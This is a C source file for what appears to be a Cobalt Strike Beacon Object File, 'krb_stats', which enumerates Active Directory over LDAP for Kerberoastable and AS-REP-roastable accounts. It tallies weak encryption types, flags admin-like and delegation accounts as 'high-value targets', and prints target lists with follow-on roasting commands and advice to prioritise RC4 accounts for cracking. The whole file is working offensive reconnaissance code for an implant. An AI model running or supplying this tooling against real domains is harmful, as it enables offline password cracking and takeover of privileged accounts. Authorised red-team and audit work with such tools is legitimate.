/*
 * krb_stats - Kerberoasting and AS-REP Roasting Statistics
 *
 * Queries LDAP for:
 * - Accounts with SPNs (Kerberoastable)
 * - Accounts with DONT_REQUIRE_PREAUTH (AS-REP roastable)
 *
 * Lists account names and provides statistics.
 *
 * Usage: krb_stats [/domain:DOMAIN] [/dc:DC] [/full]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* LDAP declarations */
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_initA(PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sA(PVOID, PCHAR, PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(PVOID);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sA(PVOID, PCHAR, ULONG, PCHAR, PCHAR*, ULONG, PVOID*);
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_first_entry(PVOID, PVOID);
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_next_entry(PVOID, PVOID);
DECLSPEC_IMPORT PCHAR* WINAPI WLDAP32$ldap_get_valuesA(PVOID, PVOID, PCHAR);
DECLSPEC_IMPORT VOID WINAPI WLDAP32$ldap_value_freeA(PCHAR*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(PVOID);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_count_entries(PVOID, PVOID);

/* LDAP constants */
#define LDAP_SCOPE_SUBTREE 2
#define LDAP_AUTH_NEGOTIATE 0x0486
#define LDAP_PORT 389
#define LDAP_SUCCESS 0

/* User Account Control flags */
#define UAC_ACCOUNTDISABLE          0x00000002
#define UAC_NORMAL_ACCOUNT          0x00000200
#define UAC_DONT_EXPIRE_PASSWORD    0x00010000
#define UAC_USE_DES_KEY_ONLY        0x00200000
#define UAC_DONT_REQUIRE_PREAUTH    0x00400000
#define UAC_TRUSTED_FOR_DELEGATION  0x00080000

/* Supported Encryption Types */
#define KERB_ENCTYPE_DES_CBC_CRC    0x01
#define KERB_ENCTYPE_DES_CBC_MD5    0x02
#define KERB_ENCTYPE_RC4_HMAC       0x04
#define KERB_ENCTYPE_AES128_CTS     0x08
#define KERB_ENCTYPE_AES256_CTS     0x10

/* Max accounts to track */
#define MAX_ACCOUNTS 100
#define MAX_NAME_LEN 64

/* Account list structure */
typedef struct _ACCOUNT_LIST {
    char names[MAX_ACCOUNTS][MAX_NAME_LEN];
    int count;
} ACCOUNT_LIST;

/* Statistics structure */
typedef struct _SPN_STATS {
    int totalAccounts;
    int userAccounts;
    int computerAccounts;
    int serviceAccounts;
    int disabledAccounts;
    int desOnlyAccounts;
    int rc4Accounts;
    int aes128Accounts;
    int aes256Accounts;
    int noPreAuthAccounts;
    int delegationAccounts;
    int adminAccounts;
    int totalSPNs;
    ACCOUNT_LIST roastable;
    ACCOUNT_LIST rc4List;
    ACCOUNT_LIST asrepRoastable;
} SPN_STATS;

/* Add account to list */
static void add_to_list(ACCOUNT_LIST* list, const char* name) {
    if (list->count >= MAX_ACCOUNTS) return;
    strncpy(list->names[list->count], name, MAX_NAME_LEN - 1);
    list->names[list->count][MAX_NAME_LEN - 1] = '\0';
    list->count++;
}

/* Check if account is admin-like based on group membership or name */
static int is_admin_account(const char* name, const char* memberOf) {
    if (!name) return 0;

    /* Check name patterns */
    if (strstr(name, "admin") || strstr(name, "Admin") ||
        strstr(name, "svc_") || strstr(name, "SVC_") ||
        strstr(name, "service") || strstr(name, "Service")) {
        return 1;
    }

    /* Check group membership */
    if (memberOf) {
        if (strstr(memberOf, "Domain Admins") ||
            strstr(memberOf, "Enterprise Admins") ||
            strstr(memberOf, "Administrators")) {
            return 1;
        }
    }

    return 0;
}

/* Parse supported encryption types - returns 1 if RC4 supported */
static int parse_enc_types(DWORD encTypes, SPN_STATS* stats) {
    int hasRC4 = 0;

    if (encTypes == 0) {
        /* Default - assume RC4 */
        stats->rc4Accounts++;
        return 1;  /* RC4 is default */
    }

    if (encTypes & KERB_ENCTYPE_DES_CBC_CRC || encTypes & KERB_ENCTYPE_DES_CBC_MD5) {
        stats->desOnlyAccounts++;
    }
    if (encTypes & KERB_ENCTYPE_RC4_HMAC) {
        stats->rc4Accounts++;
        hasRC4 = 1;
    }
    if (encTypes & KERB_ENCTYPE_AES128_CTS) {
        stats->aes128Accounts++;
    }
    if (encTypes & KERB_ENCTYPE_AES256_CTS) {
        stats->aes256Accounts++;
    }

    /* If no encTypes explicitly set, assume RC4 */
    if (!(encTypes & (KERB_ENCTYPE_RC4_HMAC | KERB_ENCTYPE_AES128_CTS | KERB_ENCTYPE_AES256_CTS))) {
        hasRC4 = 1;
    }

    return hasRC4;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* domain = NULL;
    char* dc = NULL;
    char* fullOutput = NULL;
    SPN_STATS stats = {0};

    BeaconFormatAlloc(&output, 131072);  /* 128KB for output */
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Kerberos Attack Statistics\n\n");


    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    fullOutput = arg_get(&parser, "full");

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
    }

    int dc_is_domain = 0;
    if (!dc) {
        dc = domain;
        dc_is_domain = 1;
    }

    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n\n", dc);

    /* Connect via LDAP */
    PVOID ldap = WLDAP32$ldap_initA(dc, LDAP_PORT);
    if (!ldap) {
        BeaconFormatPrintf(&output, "[-] Failed to initialize LDAP connection\n");
        goto cleanup;
    }

    ULONG ldapResult = WLDAP32$ldap_bind_sA(ldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldapResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(&output, "[-] LDAP bind failed: %d\n", ldapResult);
        WLDAP32$ldap_unbind(ldap);
        goto cleanup;
    }

    /* Build search base */
    char searchBase[512];
    char* domainCopy = (char*)malloc(strlen(domain) + 1);
    strcpy(domainCopy, domain);

    strcpy(searchBase, "DC=");
    char* part = strtok(domainCopy, ".");
    int first = 1;
    while (part) {
        if (!first) strcat(searchBase, ",DC=");
        strcat(searchBase, part);
        first = 0;
        part = strtok(NULL, ".");
    }
    free(domainCopy);

    /* ========== SEARCH 1: Accounts with SPNs (Kerberoastable) ========== */
    BeaconFormatPrintf(&output, "[*] Searching for Kerberoastable accounts (SPNs)...\n");

    char* spnFilter = "(&(servicePrincipalName=*)(!(objectClass=computer)))";
    char* attrs[] = { "sAMAccountName", "servicePrincipalName", "userAccountControl",
                      "msDS-SupportedEncryptionTypes", "memberOf", NULL };
    PVOID searchResult = NULL;

    ldapResult = WLDAP32$ldap_search_sA(ldap, searchBase, LDAP_SCOPE_SUBTREE,
                                         spnFilter, attrs, 0, &searchResult);

    if (ldapResult == LDAP_SUCCESS && searchResult) {
        int entryCount = WLDAP32$ldap_count_entries(ldap, searchResult);
        BeaconFormatPrintf(&output, "[*] Found %d accounts with SPNs\n", entryCount);

        /* Process each entry */
        PVOID entry = WLDAP32$ldap_first_entry(ldap, searchResult);
        while (entry) {
            stats.totalAccounts++;

            /* Get sAMAccountName */
            PCHAR* nameVals = WLDAP32$ldap_get_valuesA(ldap, entry, "sAMAccountName");
            char* name = nameVals && nameVals[0] ? nameVals[0] : "(unknown)";

            /* Get SPNs */
            PCHAR* spnVals = WLDAP32$ldap_get_valuesA(ldap, entry, "servicePrincipalName");
            int spnCount = 0;
            if (spnVals) {
                while (spnVals[spnCount]) spnCount++;
                stats.totalSPNs += spnCount;
            }

            /* Get userAccountControl */
            PCHAR* uacVals = WLDAP32$ldap_get_valuesA(ldap, entry, "userAccountControl");
            DWORD uac = uacVals && uacVals[0] ? (DWORD)atol(uacVals[0]) : 0;

            /* Get encryption types */
            PCHAR* encVals = WLDAP32$ldap_get_valuesA(ldap, entry, "msDS-SupportedEncryptionTypes");
            DWORD encTypes = encVals && encVals[0] ? (DWORD)atol(encVals[0]) : 0;

            /* Get memberOf */
            PCHAR* memberVals = WLDAP32$ldap_get_valuesA(ldap, entry, "memberOf");
            char* memberOf = memberVals && memberVals[0] ? memberVals[0] : NULL;

            /* Classify account */
            int isDisabled = (uac & UAC_ACCOUNTDISABLE) ? 1 : 0;
            if (isDisabled) {
                stats.disabledAccounts++;
            }

            if (uac & UAC_DONT_REQUIRE_PREAUTH) {
                stats.noPreAuthAccounts++;
            }

            if (uac & UAC_TRUSTED_FOR_DELEGATION) {
                stats.delegationAccounts++;
            }

            if (is_admin_account(name, memberOf)) {
                stats.adminAccounts++;
            }

            /* Classify by name pattern */
            if (strstr(name, "$")) {
                stats.computerAccounts++;
            } else if (strstr(name, "svc") || strstr(name, "SVC") ||
                       strstr(name, "service") || strstr(name, "Service")) {
                stats.serviceAccounts++;
            } else {
                stats.userAccounts++;
            }

            /* Parse encryption types and track RC4 accounts */
            int hasRC4 = parse_enc_types(encTypes, &stats);

            /* Add to roastable list if not disabled */
            if (!isDisabled) {
                add_to_list(&stats.roastable, name);
                if (hasRC4 || encTypes == 0) {
                    add_to_list(&stats.rc4List, name);
                }
            }

            /* Cleanup */
            if (nameVals) WLDAP32$ldap_value_freeA(nameVals);
            if (spnVals) WLDAP32$ldap_value_freeA(spnVals);
            if (uacVals) WLDAP32$ldap_value_freeA(uacVals);
            if (encVals) WLDAP32$ldap_value_freeA(encVals);
            if (memberVals) WLDAP32$ldap_value_freeA(memberVals);

            entry = WLDAP32$ldap_next_entry(ldap, entry);
        }

        WLDAP32$ldap_msgfree(searchResult);
    }

    /* ========== SEARCH 2: AS-REP Roastable accounts ========== */
    BeaconFormatPrintf(&output, "[*] Searching for AS-REP Roastable accounts...\n");

    /* DONT_REQUIRE_PREAUTH = 0x400000 = 4194304 */
    char* asrepFilter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
    char* asrepAttrs[] = { "sAMAccountName", "userAccountControl", NULL };
    PVOID asrepResult = NULL;

    ldapResult = WLDAP32$ldap_search_sA(ldap, searchBase, LDAP_SCOPE_SUBTREE,
                                         asrepFilter, asrepAttrs, 0, &asrepResult);

    int asrepCount = 0;
    if (ldapResult == LDAP_SUCCESS && asrepResult) {
        asrepCount = WLDAP32$ldap_count_entries(ldap, asrepResult);
        BeaconFormatPrintf(&output, "[*] Found %d AS-REP roastable accounts\n\n", asrepCount);

        /* Process AS-REP roastable entries */
        PVOID entry = WLDAP32$ldap_first_entry(ldap, asrepResult);
        while (entry) {
            PCHAR* nameVals = WLDAP32$ldap_get_valuesA(ldap, entry, "sAMAccountName");
            if (nameVals && nameVals[0]) {
                add_to_list(&stats.asrepRoastable, nameVals[0]);
            }
            if (nameVals) WLDAP32$ldap_value_freeA(nameVals);
            entry = WLDAP32$ldap_next_entry(ldap, entry);
        }

        WLDAP32$ldap_msgfree(asrepResult);
    }

    WLDAP32$ldap_unbind(ldap);

    /* ========== Print Statistics ========== */
    BeaconFormatPrintf(&output, "========================================\n");
    BeaconFormatPrintf(&output, "      KERBEROS ATTACK STATISTICS\n");
    BeaconFormatPrintf(&output, "========================================\n\n");

    BeaconFormatPrintf(&output, "=== KERBEROASTING (SPN Accounts) ===\n");
    BeaconFormatPrintf(&output, "  Total SPN accounts:     %d\n", stats.totalAccounts);
    BeaconFormatPrintf(&output, "  User accounts:          %d\n", stats.userAccounts);
    BeaconFormatPrintf(&output, "  Service accounts:       %d\n", stats.serviceAccounts);
    BeaconFormatPrintf(&output, "  Computer accounts:      %d\n", stats.computerAccounts);
    BeaconFormatPrintf(&output, "  Disabled accounts:      %d\n", stats.disabledAccounts);
    BeaconFormatPrintf(&output, "  Total SPNs:             %d\n", stats.totalSPNs);

    BeaconFormatPrintf(&output, "\n  Encryption Types:\n");
    BeaconFormatPrintf(&output, "    DES-only:             %d (weak!)\n", stats.desOnlyAccounts);
    BeaconFormatPrintf(&output, "    RC4 supported:        %d (crackable)\n", stats.rc4Accounts);
    BeaconFormatPrintf(&output, "    AES128 supported:     %d\n", stats.aes128Accounts);
    BeaconFormatPrintf(&output, "    AES256 supported:     %d\n", stats.aes256Accounts);

    BeaconFormatPrintf(&output, "\n=== AS-REP ROASTING ===\n");
    BeaconFormatPrintf(&output, "  No preauth required:    %d\n", stats.asrepRoastable.count);

    BeaconFormatPrintf(&output, "\n=== HIGH-VALUE TARGETS ===\n");
    BeaconFormatPrintf(&output, "  Admin-like accounts:    %d\n", stats.adminAccounts);
    BeaconFormatPrintf(&output, "  Delegation enabled:     %d\n", stats.delegationAccounts);

    /* ========== List Roastable Accounts ========== */
    BeaconFormatPrintf(&output, "\n========================================\n");
    BeaconFormatPrintf(&output, "         TARGET ACCOUNT LISTS\n");
    BeaconFormatPrintf(&output, "========================================\n");

    /* List Kerberoastable accounts */
    if (stats.roastable.count > 0) {
        BeaconFormatPrintf(&output, "\n[+] KERBEROASTABLE ACCOUNTS (%d):\n", stats.roastable.count);
        for (int i = 0; i < stats.roastable.count; i++) {
            BeaconFormatPrintf(&output, "    - %s\n", stats.roastable.names[i]);
        }
        BeaconFormatPrintf(&output, "\n    Command: krb_kerberoasting /user:<USERNAME>\n");
    }

    /* List RC4-supporting accounts */
    if (stats.rc4List.count > 0) {
        BeaconFormatPrintf(&output, "\n[+] RC4-SUPPORTING ACCOUNTS (%d):\n", stats.rc4List.count);
        for (int i = 0; i < stats.rc4List.count; i++) {
            BeaconFormatPrintf(&output, "    - %s\n", stats.rc4List.names[i]);
        }
    }

    /* List AS-REP roastable accounts */
    if (stats.asrepRoastable.count > 0) {
        BeaconFormatPrintf(&output, "\n[+] AS-REP ROASTABLE ACCOUNTS (%d) - NO PREAUTH - PRIORITIZE THESE:\n", stats.asrepRoastable.count);
        for (int i = 0; i < stats.asrepRoastable.count; i++) {
            BeaconFormatPrintf(&output, "    - %s\n", stats.asrepRoastable.names[i]);
        }
        BeaconFormatPrintf(&output, "\n    Command: krb_asreproasting /user:<USERNAME>\n");
        BeaconFormatPrintf(&output, "    Or auto: krb_asreproast_auto\n");
    }

    BeaconFormatPrintf(&output, "\n========================================\n");

    /* Summary */
    int roastable = stats.totalAccounts - stats.disabledAccounts;
    BeaconFormatPrintf(&output, "\nSUMMARY:\n");
    BeaconFormatPrintf(&output, "  Kerberoastable: %d accounts\n", roastable);
    BeaconFormatPrintf(&output, "  AS-REP Roastable: %d accounts\n", stats.asrepRoastable.count);

    if (stats.rc4List.count > 0) {
        BeaconFormatPrintf(&output, "\n[!] %d accounts support RC4 - prioritize these for cracking!\n", stats.rc4List.count);
    }

    if (stats.asrepRoastable.count > 0) {
        BeaconFormatPrintf(&output, "[!] %d accounts don't require preauth - use AS-REP roasting!\n", stats.asrepRoastable.count);
    }

cleanup:
    if (domain) free(domain);
    if (dc && !dc_is_domain) free(dc);
    if (fullOutput) free(fullOutput);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
